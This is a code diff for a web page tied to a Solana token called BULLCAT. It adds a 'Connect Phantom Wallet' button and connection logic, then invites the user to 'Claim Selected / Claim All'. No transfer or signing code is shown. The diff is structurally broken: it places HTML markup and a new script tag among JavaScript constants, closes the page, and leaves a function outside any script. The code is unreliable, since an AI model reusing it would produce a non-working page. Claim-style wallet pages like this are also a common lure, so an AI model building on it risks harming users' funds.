@@ -81,44 +81,64 @@
     const BULLCAT_MINT = "2rofffRpuLXYwXptyzABZkrXs7zkb6wYnyZdqj1apump";
     const RPC_URL = "https://api.mainnet-beta.solana.com";
 
+     <button onclick="connectWallet()" id="connectBtn"
+          class="w-full py-6 bg-white text-black rounded-2xl font-bold text-xl flex items-center justify-center gap-3 hover:bg-gray-100 transition">
+    <i class="fas fa-wallet"></i>
+    <span id="btnText">CONNECT PHANTOM WALLET</span>
+  </button>
+</div>
+
+<p class="text-center text-xs text-gray-500 mt-8">
+  Click above to trigger wallet connection popup
+</p>  </div>
+
+  <script>
+    let connectedPublicKey = null;
+
     async function connectWallet() {
-      const btnText = document.getElementById("connectText");
+      const btnText = document.getElementById("btnText");
 
       if (typeof window.solana === "undefined") {
-        alert("Phantom Wallet is not installed.\nPlease install Phantom extension.");
+        alert("Phantom Wallet is not installed or not enabled.\n\nPlease install Phantom and refresh.");
         return;
       }
 
       try {
-        btnText.innerHTML = "Connecting...";
-        provider = window.solana;
+        btnText.innerHTML = "Waiting for approval...";
 
-        const response = await window.solana.connect({ onlyIfTrusted: false });
-        
+        // This should force the popup + approval screen
+        const response = await window.solana.connect({ 
+          onlyIfTrusted: false 
+        });
+
         connectedPublicKey = response.publicKey.toString();
 
-        document.getElementById("walletAddress").textContent = 
-          `${connectedPublicKey.slice(0,8)}...${connectedPublicKey.slice(-6)}`;
+        document.getElementById("status").classList.remove("hidden");
+        document.getElementById("status").innerHTML = ` Connected<br><small>${connectedPublicKey.slice(0,8)}...${connectedPublicKey.slice(-6)}</small>`;
 
+        btnText.innerHTML = " WALLET CONNECTED";
         document.getElementById("connectBtn").disabled = true;
-        btnText.innerHTML = "✅ CONNECTED";
 
-        connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
-        await fetchBalance();
+        alert("Wallet successfully connected!\n\nYou can now use Claim Selected / Claim All.");
 
       } catch (error) {
-        btnText.innerHTML = "CONNECT PHANTOM";
-        
+        btnText.innerHTML = "CONNECT PHANTOM WALLET";
         if (error.code === 4001) {
-          alert("Connection was cancelled by user.");
-        } else if (error.message && error.message.includes("rejected")) {
-          alert("Connection rejected. Please try again.");
+          alert("Connection request was cancelled.");
         } else {
           console.error(error);
-          alert("Phantom connection failed.\nMake sure Phantom is unlocked and try again.");
+          alert("Failed to connect. Make sure Phantom is unlocked.");
         }
       }
     }
+
+    // Expose for buttons
+    window.connectWallet = connectWallet;
+  </script>
+</body>
+</html>
+
+
 
     async function fetchBalance() {
       if (!connectedPublicKey) return;
